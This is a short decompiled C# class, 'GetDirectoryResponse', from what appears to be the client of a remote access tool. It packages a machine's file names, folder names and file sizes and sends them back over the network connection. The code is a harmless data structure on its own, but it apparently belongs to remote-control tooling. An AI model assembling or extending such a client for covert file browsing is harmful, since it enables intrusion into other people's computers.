using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x02000082 RID: 130
	[Serializable]
	public class GetDirectoryResponse : IPacket
	{
		// Token: 0x1700006F RID: 111
		// (get) Token: 0x06000350 RID: 848 RVA: 0x000039AA File Offset: 0x00001BAA
		// (set) Token: 0x06000351 RID: 849 RVA: 0x000039B2 File Offset: 0x00001BB2
		public string[] Files { get; set; }

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x06000352 RID: 850 RVA: 0x000039BB File Offset: 0x00001BBB
		// (set) Token: 0x06000353 RID: 851 RVA: 0x000039C3 File Offset: 0x00001BC3
		public string[] Folders { get; set; }

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x06000354 RID: 852 RVA: 0x000039CC File Offset: 0x00001BCC
		// (set) Token: 0x06000355 RID: 853 RVA: 0x000039D4 File Offset: 0x00001BD4
		public long[] FilesSize { get; set; }

		// Token: 0x06000356 RID: 854 RVA: 0x000021D4 File Offset: 0x000003D4
		public GetDirectoryResponse()
		{
		}

		// Token: 0x06000357 RID: 855 RVA: 0x000039DD File Offset: 0x00001BDD
		public GetDirectoryResponse(string[] files, string[] folders, long[] filessize)
		{
			this.Files = files;
			this.Folders = folders;
			this.FilesSize = filessize;
		}

		// Token: 0x06000358 RID: 856 RVA: 0x000039FA File Offset: 0x00001BFA
		public void Execute(Client client)
		{
			client.Send<GetDirectoryResponse>(this);
		}
	}
}
